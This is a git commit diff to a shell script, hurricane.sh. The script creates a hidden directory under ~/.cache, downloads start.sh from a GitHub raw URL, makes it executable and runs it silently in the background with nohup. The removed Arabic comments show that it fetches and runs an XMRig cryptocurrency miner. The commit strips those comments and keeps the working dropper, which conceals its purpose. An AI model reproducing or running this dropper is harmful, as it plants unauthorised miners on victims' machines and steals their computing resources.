9a6ff525e4c082c46c556b3733916d15a918f9d1
ewilkinso <ewilkinson3@alaska.edu>
2025-08-13 10:27:13 +0100

    Update hurricane.sh

--- hurricane.sh
+++ hurricane.sh
@@ -1,16 +1,10 @@
 #!/bin/bash
 
-# إعداد بيانات المحفظة والمعدّن
-# مجلد العمل
-WORKDIR="$HOME/.cache/.sysd"  # ← مجلد خفي داخل .cache
+WORKDIR="$HOME/.cache/.sysd"
 mkdir -p "$WORKDIR" && cd "$WORKDIR"
 
-# تحميل النسخة الجاهزة من XMRig (Linux x64)
 wget https://raw.githubusercontent.com/ewilkinso/ruby/refs/heads/main/start.sh
 
-# فك الضغط
 chmod +x start.sh
 
-
-# تشغيل المعدّن في الخلفية باستخدام nohup
 nohup ./start.sh > cpu_output.log 2>&1 &
